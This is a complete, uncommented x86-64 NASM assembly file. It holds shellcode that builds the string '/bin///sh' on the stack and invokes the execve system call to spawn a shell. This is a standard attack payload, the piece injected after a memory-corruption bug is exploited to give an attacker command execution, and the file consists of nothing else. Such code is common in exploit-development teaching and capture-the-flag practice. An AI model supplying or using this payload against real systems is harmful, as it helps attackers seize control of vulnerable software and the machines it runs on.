BITS 64

global _start

_start:
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
